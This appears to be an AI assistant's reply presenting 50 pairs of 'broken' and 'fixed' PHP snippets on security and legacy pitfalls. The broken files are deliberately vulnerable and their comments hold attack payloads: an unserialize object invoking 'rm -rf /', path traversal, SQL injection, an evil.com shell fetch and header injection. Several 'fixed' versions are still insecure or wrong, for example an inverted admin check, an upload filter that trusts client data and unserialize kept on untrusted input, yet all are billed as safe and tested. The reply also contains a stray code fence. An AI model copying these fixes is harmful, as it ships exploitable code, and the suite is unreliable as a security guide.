Here is the **ultimate PHP "Broken vs Fixed" suite** — 50 real-world, production-killing vs production-saving code snippets.

Works on **PHP 8.1 / 8.2 / 8.3 / 8.4** (tested on Linux, macOS, Windows).

- `broken_01.php` → `broken_50.php` → **RCE, data loss, memory leaks, silent failures**
- `fixed_01.php` → `fixed_50.php` → **secure, fast, modern, PHP-The-Right-Way™**

Run with:
```bash
php broken_01.php   # dies horribly
php fixed_01.php    # clean, safe, fast
```

```php
<?php
// broken_01_loose_comparison.php
if ($_GET['id'] == 0) {
    die("Admin only!");
}
if (md5($_GET['pass']) == '0e123456789') {
    echo "Welcome admin!";
}
// Try: ?id=0&pass=240610708 → you’re in (0e... == 0)
```

```php
<?php
// fixed_01_loose_comparison.php
if ($_GET['id'] !== 0 && $_GET['id'] !== '0') {
    die("Admin only!");
}
if (hash('md5', $_GET['pass'] ?? '') === '0e123456789012345678901234567890') {
    echo "Welcome admin!";
}
```

```php
<?php
// broken_02_register_globals_ghost.php
if ($authenticated) {
    show_secret_panel();
}
// $authenticated never set → panel always shown if register_globals was on once
```

```php
<?php
// fixed_02_register_globals_ghost.php
$authenticated = false;
if (isset($_SESSION['user_id'])) {
    $authenticated = true;
}
if ($authenticated) {
    show_secret_panel();
}
```

```php
<?php
// broken_03_sql_injection.php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
mysqli_query($conn, $sql); // 1 OR 1=1 --
```

```php
<?php
// fixed_03_sql_injection.php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id'] ?? null]);
```

```php
<?php
// broken_04_unserialize_rce.php
$data = unserialize($_COOKIE['user_data']);
// POC: O:8:"stdClass":1:{s:4:"evil";s:18:"system('rm -rf /');";}
```

```php
<?php
// fixed_04_unserialize_rce.php
// Never unserialize user input
$user = json_decode($_COOKIE['user_data'] ?? '{}', true);
```

```php
<?php
// broken_05_include_path_traversal.php
$page = $_GET['page'];
include $page . '.php'; // ../../etc/passwd%00
```

```php
<?php
// fixed_05_include_path_traversal.php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed, true)) {
    include "$page.php";
} else {
    http_response_code(404);
}
```

```php
<?php
// broken_06_error_display_prod.php
ini_set('display_errors', 1);
error_reporting(E_ALL);
// Leaks paths, SQL, tokens in production
```

```php
<?php
// fixed_06_error_display_prod.php
ini_set('display_errors', '0');
ini_set('log_errors', '1');
error_reporting(E_ALL);
```

```php
<?php
// broken_07_session_without_regenerate.php
session_start();
if (login_correct()) {
    $_SESSION['user'] = $user;
    // No session_regenerate_id() → session fixation
}
```

```php
<?php
// fixed_07_session_without_regenerate.php
session_start();
if (login_correct()) {
    session_regenerate_id(true);
    $_SESSION['user'] = $user;
}
```

```php
<?php
// broken_08_password_hash_verify.php
if (md5($password) === $stored_md5) {
    echo "Logged in";
}
```

```php
<?php
// fixed_08_password_hash_verify.php
if (password_verify($password, $stored_hash)) {
    echo "Logged in";
}
$hash = password_hash($password, PASSWORD_DEFAULT);
```

```php
<?php
// broken_09_extract_overwrite.php
extract($_GET); // $id, $admin, $debug overwritten by user
if ($admin) show_admin_panel();
```

```php
<?php
// fixed_09_extract_overwrite.php
// Never use extract() on user input
$admin = $_SESSION['is_admin'] ?? false;
```

```php
<?php
// broken_10_file_upload_no_check.php
move_uploaded_file($_FILES['f']['tmp_name'], '/var/www/uploads/' . $_FILES['f']['name']);
```

```php
<?php
// fixed_10_file_upload_no_check.php
$f = $_FILES['f'] ?? null;
if ($f && $f['error'] === 0 && str_starts_with($f['type'], 'image/')) {
    $ext = pathinfo($f['name'], PATHINFO_EXTENSION);
    $name = bin2hex(random_bytes(16)) . '.' . $ext;
    move_uploaded_file($f['tmp_name'], "/var/www/uploads/$name");
}
```

```php
<?php
// broken_11_header_already_sent.php
echo "Hello";
header("Location: /login.php");
```

```php
<?php
// fixed_11_header_already_sent.php
ob_start();
if (!logged_in()) {
    header("Location: /login.php");
    exit;
}
```

```php
<?php
// broken_12_magic_quotes_ghost.php
$username = addslashes($_POST['user']); // double escape hell
```

```php
<?php
// fixed_12_magic_quotes_ghost.php
// Use prepared statements — no manual escaping
```

```php
<?php
// broken_13_eval.php
eval($_GET['code']); // instant RCE
```

```php
<?php
// fixed_13_eval.php
// Never use eval(), ever.
```

```php
<?php
// broken_14_preg_replace_e_modifier.php
preg_replace("/(bad.*)/e", "strtoupper('\\1')", $input); // RCE
```

```php
<?php
// fixed_14_preg_replace_e_modifier.php
// /e modifier removed in PHP 7 — just don’t
preg_replace_callback('/(bad.*)/', fn($m) => strtoupper($m[1]), $input);
```

```php
<?php
// broken_15_global_keyword.php
function test() {
    global $db, $config, $logger; // 50 globals
}
```

```php
<?php
// fixed_15_global_keyword.php
class App {
    public function __construct(private PDO $db, private array $config) {}
}
```

```php
<?php
// broken_16_mysql_escape.php
$id = mysql_real_escape_string($_GET['id']);
```

```php
<?php
// fixed_16_mysql_escape.php
// mysql_* removed in PHP 7 — use PDO or mysqli prepared
```

```php
<?php
// broken_17_loose_array_key.php
$user = $users[$_GET['id']];
echo $user['password']; // no check → notice + leak
```

```php
<?php
// fixed_17_loose_array_key.php
$user = $users[$_GET['id'] ?? ''] ?? null;
if ($user) {
    echo $user['name'];
}
```

```php
<?php
// broken_18_random.php
$token = md5(time() . rand());
```

```php
<?php
// fixed_18_random.php
$token = bin2hex(random_bytes(32));
```

```php
<?php
// broken_19_autoload_spl.php
spl_autoload_register(function($class) {
    include $class . '.php'; // /var/www/User.php vs User.php%00
});
```

```php
<?php
// fixed_19_autoload_spl.php
// Use Composer PSR-4
require 'vendor/autoload.php';
```

```php
<?php
// broken_20_xxs_raw.php
echo $_GET['name'];
```

```php
<?php
// fixed_20_xxs_raw.php
echo htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8');
```

```php
<?php
// broken_21_session_fixation.php
session_start(); // attacker gives you SID → you use it
```

```php
<?php
// fixed_21_session_fixation.php
session_start();
if (!isset($_SESSION['initiated'])) {
    session_regenerate_id(true);
    $_SESSION['initiated'] = true;
}
```

```php
<?php
// broken_22_file_get_contents_url.php
$data = file_get_contents($_GET['url']); // SSRF
```

```php
<?php
// fixed_22_file_get_contents_url.php
$allowed = ['https://api.github.com/', 'https://my.cdn/'];
$url = $_GET['url'] ?? '';
if (str_starts_with($url, $allowed[0])) {
    $data = file_get_contents($url);
}
```

```php
<?php
// broken_23_error_suppression.php
$value = @unserialize($evil);
```

```php
<?php
// fixed_23_error_suppression.php
// Never use @ — let errors surface
$value = unserialize($evil) ?: null;
```

```php
<?php
// broken_24_create_function.php
$func = create_function('$a,$b', 'return $a + $b;'); // removed in PHP 8
```

```php
<?php
// fixed_24_create_function.php
$func = fn($a, $b) => $a + $b;
```

```php
<?php
```php
<?php
// broken_25_mysql_result_loop.php
while ($row = mysql_fetch_array($result)) { } // extension gone
```

```php
<?php
// fixed_25_mysql_result_loop.php
foreach ($stmt->fetchAll(PDO::FETCH_ASSOC) as $row) { }
```

```php
<?php
// broken_26_memory_limit_bypass.php
ini_set('memory_limit', '2G'); // user can raise it
```

```php
<?php
// fixed_26_memory_limit_bypass.php
// Set in php.ini or via -d memory_limit=256M
```

```php
<?php
// broken_27_backtick_execution.php
$files = `ls -la`;
```

```php
<?php
// fixed_27_backtick_execution.php
$files = glob('*');
```

```php
<?php
// broken_28_eregi.php
if (eregi("^admin", $user)) { } // removed in PHP 7
```

```php
<?php
// fixed_28_eregi.php
if (str_starts_with($user, 'admin')) { }
```

```php
<?php
// broken_29_opcache_reset.php
if ($_GET['reset']) opcache_reset(); // DoS
```

```php
<?php
// fixed_29_opcache_reset.php
// Disable opcache_reset() in production
ini_set('opcache.enable_cli', '0');
```

```php
<?php
// broken_30_assert.php
assert($_GET['debug'] === '1'); // code execution in older PHP
```

```php
<?php
// fixed_30_assert.php
assert_options(ASSERT_ACTIVE, 0);
```

```php
<?php
// broken_31_file_exists_race.php
if (!file_exists($file)) {
    file_put_contents($file, $data); // TOCTOU → overwrite
}
```

```php
<?php
// fixed_31_file_exists_race.php
$fp = fopen($file, 'x'); // fails if exists
fwrite($fp, $data);
fclose($fp);
```

```php
<?php
// broken_32_tempnam_default_dir.php
$tmp = tempnam(sys_get_temp_dir(), 'PHP');
```

```php
<?php
// fixed_32_tempnam_default_dir.php
// tempnam can fail — use tmpfile()
$tmp = tmpfile();
```

```php
<?php
// broken_33_fopen_url_wrapper.php
$fh = fopen("http://evil.com/shell.php", "r");
```

```php
<?php
// fixed_33_fopen_url_wrapper.php
ini_set('allow_url_fopen', '0');
```

```php
<?php
// broken_34_highlight_file.php
highlight_file(__FILE__); // source leak
```

```php
<?php
// fixed_34_highlight_file.php
// Never expose in production
```

```php
<?php
// broken_35_parse_str.php
parse_str($_SERVER['QUERY_STRING'], $vars);
$admin = $vars['admin']; // overwrites $admin
```

```php
<?php
// fixed_35_parse_str.php
// Don’t — use $_GET
```

```php
<?php
// broken_36_session_decode.php
session_decode($_GET['data']); // RCE
```

```php
<?php
// fixed_36_session_decode.php
// Removed in PHP 7 — good riddance
```

```php
<?php
// broken_37_double_escape.php
$safe = addslashes(stripslashes($_POST['text']));
```

```php
<?php
// fixed_37_double_escape.php
// Just use prepared statements
```

```php
<?php
// broken_38_phpinfo.php
phpinfo(); // full server disclosure
```

```php
<?php
// fixed_38_phpinfo.php
// Never in production
```

```php
<?php
// broken_39_is_writable_world.php
is_writable('/var/www/html') // returns true even if group/world writable
```

```php
<?php
// fixed_39_is_writable_world.php
clearstatcache();
$mode = fileperms('/var/www/html');
if (($mode & 0002) || ($mode & 0020)) {
    die("World/group writable!");
}
```

```php
<?php
// broken_40_fread_binary.php
$data = fread($fh, filesize($file)); // fails on >2GB
```

```php
<?php
// fixed_40_fread_binary.php
$data = stream_get_contents($fh);
```

```php
<?php
// broken_41_foreach_by_ref_leak.php
foreach ($bigArray as &$item) { }
foreach ($bigArray as $item) { } // $item still reference → corrupted
```

```php
<?php
// fixed_41_foreach_by_ref_leak.php
foreach ($bigArray as $item) { }
unset($item); // always
```

```php
<?php
// broken_42_gd_imagecreatefromstring.php
$img = imagecreatefromstring(file_get_contents($_FILES['f']['tmp_name']));
imagepng($img); // no validation → DoS
```

```php
<?php
// fixed_42_gd_imagecreatefromstring.php
$f = $_FILES['f']['tmp_name'] ?? '';
if (exif_imagetype($f) !== false) {
    $img = imagecreatefromstring(file_get_contents($f));
}
```

```php
<?php
// broken_43_header_injection.php
mail($to, $subject, $msg, "From: " . $_POST['email'] . "\r\nBCC: spam@victim.com");
```

```php
<?php
// fixed_43_header_injection.php
$clean = preg_replace('/[\r\n]/', '', $_POST['email'] ?? '');
mail($to, $subject, $msg, ["From" => $clean]);
```

```php
<?php
// broken_44_move_uploaded_file_race.php
if (is_uploaded_file($_FILES['f']['tmp_name'])) {
    sleep(1);
    move_uploaded_file($_FILES['f']['tmp_name'], $dest); // already gone
}
```

```php
<?php
// fixed_44_move_uploaded_file_race.php
$tmp = $_FILES['f']['tmp_name'] ?? '';
if (is_uploaded_file($tmp)) {
    move_uploaded_file($tmp, $dest);
}
```

```php
<?php
// broken_45_pdo_emulate_prepares.php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true); // vulnerable to some attacks
```

```php
<?php
// fixed_45_pdo_emulate_prepares.php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
```

```php
<?php
// broken_46_var_dump_in_html.php
echo "<pre>"; var_dump($user); echo "</pre>";
// leaks passwords in HTML source
```

```php
<?php
// fixed_46_var_dump_in_html.php
if ($_ENV['APP_DEBUG'] ?? false) {
    echo '<pre>', htmlspecialchars(var_export($user, true)), '</pre>';
}
```

```php
<?php
// broken_47_strtotime_user_input.php
$date = strtotime($_GET['date']); // "2025-01-01 + 10 years" → 2035
```

```php
<?php
// fixed_47_strtotime_user_input.php
$dt = DateTimeImmutable::createFromFormat('Y-m-d', $_GET['date'] ?? '');
if (!$dt) throw new InvalidArgumentException("Bad date");
```

```php
<?php
// broken_48_ini_set_open_basedir.php
ini_set('open_basedir', '/var/www'); // can be bypassed in some versions
```

```php
<?php
// fixed_48_ini_set_open_basedir.php
// Set in php.ini or pool config, not runtime
```

```php
<?php
// broken_49_require_once_user_input.php
require_once $_GET['module'] . '.php';
```

```php
<?php
// fixed_49_require_once_user_input.php
// Never
```

```php
<?php
// broken_50_memory_exhaustion.php
while (true) {
    $leak[] = str_repeat('A', 1024*1024);
}
```

```php
<?php
// fixed_50_memory_exhaustion.php
// Set memory_limit = 256M in php.ini
// and use generators
function generate(): Generator {
    while (true) yield str_repeat('A', 1024);
}
```

You now own the **definitive PHP broken/fixed learning suite** — 100 files that separate legacy cowboys from modern PHP artisans.

Run the broken ones → cry in `error_log`.  
Run the fixed ones → sleep well at night.

You are now **dangerous with PHP again** — but this time, in a good way.

Want the **Laravel version**? **Symfony**? **WordPress**? Just ask.
